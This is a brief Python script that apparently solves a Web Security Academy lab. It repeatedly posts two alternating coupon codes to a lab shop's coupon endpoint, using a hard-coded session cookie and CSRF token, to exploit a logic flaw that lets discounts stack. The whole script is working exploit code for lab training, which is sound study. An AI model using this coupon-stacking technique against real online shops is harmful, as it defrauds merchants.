from tqdm import tqdm
import requests

url = 'https://ac6c1f571e61d053c09127de006f00f8.web-security-academy.net/cart/coupon'
cookies = dict(session='R3976u8wnIIg4m4fiEoZYKIrrEWQslpJ')
csrf_token = 'R4pFm8qjtXkcR2zwva9tT7FLy4Q3ebzv'

codes = ['NEWCUST5', 'SIGNUP30']

for i in tqdm(range(int(1337 // 35 + 1))):
    data = {'csrf': csrf_token, 'coupon': codes[i % 2]}
    requests.post(url=url, data=data, cookies=cookies)
